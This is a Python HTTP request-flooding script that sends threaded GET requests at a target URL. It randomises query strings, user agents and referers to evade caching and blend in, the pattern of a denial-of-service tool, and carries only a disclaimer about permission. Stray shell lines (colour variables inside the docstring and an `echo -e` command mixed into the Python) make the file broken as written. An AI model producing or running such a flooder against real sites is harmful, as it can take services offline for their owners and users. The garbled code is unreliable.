#!/usr/bin/env python3
"""
# Colors
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'


⚠️ WARNING:
Only use this against servers YOU OWN or have explicit permission to test.
Unauthorized use can violate laws and terms of service.
"""

import argparse
import logging
import random
import time
from concurrent.futures import ThreadPoolExecutor
import requests

echo -e "${CYAN}"
# ---------- Big Banner ----------
BANNER = r"""
      _____   _____ 
   / ____| / ____|
  | |  __ | |  __ 
  | | |_ || | |_|
  | |__| || |__| 
   \_____/ \_____/   

    ---------MADE BY GG---------                       
                                           
"""

# ---------- Config ----------
referers = [
    "https://google.com/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://youtube.com/",
    "https://yandex.com/",
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
]

running = False
executor = None


def genstr(size: int) -> str:
    """Generate random uppercase string of given size."""
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))


def make_request(url: str):
    """Send one HTTP GET request with random headers."""
    try:
        headers = {
            "User-Agent": random.choice(user_agents),
            "Referer": random.choice(referers),
        }
        full_url = f"{url}?{genstr(random.randint(3, 10))}"
        resp = requests.get(full_url, headers=headers, timeout=5)
        if resp.status_code == 200:
            logging.info(f"✅ {resp.status_code} {full_url}")
        else:
            logging.warning(f"⚠️ {resp.status_code} {full_url}")
    except Exception as e:
        logging.error(f"❌ {e}")


def worker(url: str, rate: float):
    """Thread worker that sends requests repeatedly until stopped."""
    global running
    interval = 1.0 / rate if rate > 0 else 1.0
    while running:
        make_request(url)
        time.sleep(interval)


def start_workers(url: str, threads: int, rate: float):
    global running, executor
    running = True
    executor = ThreadPoolExecutor(max_workers=threads)
    for _ in range(threads):
        executor.submit(worker, url, rate)
    logging.info(f"🚀 Started {threads} threads at {rate} req/s -> {url}")


def stop_workers():
    global running, executor
    running = False
    if executor:
        try:
            executor.shutdown(wait=False)
        except Exception:
            pass
        executor = None
    logging.info("🛑 All threads stopped.")


def parse_args():
    parser = argparse.ArgumentParser(description="Standalone Request Sender (no Flask).")
    parser.add_argument("--url", "-u", required=False, help="Target URL (must start with http:// or https://)")
    parser.add_argument("--threads", "-t", type=int, default=5, help="Number of threads (default 5)")
    parser.add_argument("--rate", "-r", type=float, default=2.0, help="Requests per second per thread (default 2.0)")
    parser.add_argument("--duration", "-d", type=int, default=0,
                        help="Duration in seconds to run (0 = until CTRL+C).")
    return parser.parse_args()


def main():
    print(BANNER)
    print("⚠️  Run this only against servers you own or have permission to test.\n")

    args = parse_args()

    if not args.url:
        url = input("Enter your target URL (only your own site!): ").strip()
        threads = int(input("Enter number of threads [5]: ") or 5)
        rate = float(input("Enter requests per second per thread [2.0]: ") or 2.0)
        duration = int(input("Enter duration in seconds (0 = until CTRL+C) [0]: ") or 0)
    else:
        url, threads, rate, duration = args.url, args.threads, args.rate, args.duration

    if not url.startswith(("http://", "https://")):
        print("❌ Invalid URL. Must start with http:// or https://")
        return

    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
    start_workers(url, threads, rate)

    try:
        if duration > 0:
            time.sleep(duration)
            stop_workers()
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        stop_workers()


if __name__ == "__main__":
    main()
